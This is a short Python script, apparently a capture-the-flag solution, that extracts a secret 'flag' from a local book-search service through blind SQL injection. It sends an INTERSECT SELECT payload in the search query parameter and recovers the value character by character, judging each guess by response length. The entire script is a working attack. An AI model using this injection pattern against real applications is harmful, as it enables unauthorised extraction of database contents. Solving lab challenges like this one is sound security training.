import requests

ALPHABET = "flag{}0123456789abcdef"

flag = ""
while True:
    for character in ALPHABET:
        r = requests.get("http://127.0.0.1:42008/search", params={
            "query": f"' INTERSECT SELECT 'So many books, so little time.' FROM flag WHERE SUBSTR(flag, {len(flag) + 1}, 1) = '{character}' AND '%' = '"
        })

        if len(r.text) > 400:
            flag += character
            print(flag)
            break
